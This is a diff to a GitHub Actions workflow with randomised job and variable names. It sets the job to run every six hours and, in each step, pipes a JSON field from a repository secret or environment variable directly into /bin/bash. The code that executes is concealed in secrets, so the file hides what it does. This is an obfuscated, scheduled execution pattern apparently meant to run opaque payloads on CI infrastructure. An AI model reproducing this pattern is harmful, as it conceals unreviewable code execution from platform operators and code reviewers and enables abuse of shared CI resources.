@@ -1,30 +1,23 @@
 name: changweiwu3891
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 5/6 * * *'
+    - cron: '23 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: changweiwu3891
         env:
-          v9: ${{ secrets.v9 }}
+          vk51945: ${{ secrets.vk51945 }}
         run: |
-          echo $v9 | jq -r .dvu44 | /bin/bash
-          echo $mclr78796 | jq -r .pf05 | /bin/bash
-          echo $xxg03689 | jq -r .b480 | /bin/bash
-          echo $xoxxr29193 | jq -r .iax85 | /bin/bash
-          echo $bg564 | jq -r .s96458 | /bin/bash
-          echo $cdux4 | jq -r .xmxem7071 | /bin/bash
-          echo $s836 | jq -r .x138 | /bin/bash
-          echo $ul2 | jq -r .i3 | /bin/bash
-          echo $lnny773 | jq -r .na44 | /bin/bash
-          echo $objcl0 | jq -r .cvhb21 | /bin/bash
-          echo $yp61520 | jq -r .u95584 | /bin/bash
-          echo $kxd31514 | jq -r .ubdxy3865 | /bin/bash
-          echo $gpdzb444 | jq -r .zu803 | /bin/bash
-          echo $xqt40972 | jq -r .alo8927 | /bin/bash
+          echo $vk51945 | jq -r .hk62707 | /bin/bash
+          echo $ma679 | jq -r .hsa976 | /bin/bash
+          echo $jzfcd8672 | jq -r .lvrep2 | /bin/bash
+          echo $wzp18817 | jq -r .vj4 | /bin/bash
+          echo $f920 | jq -r .oers049 | /bin/bash
+          echo $hhz794 | jq -r .j510 | /bin/bash
 
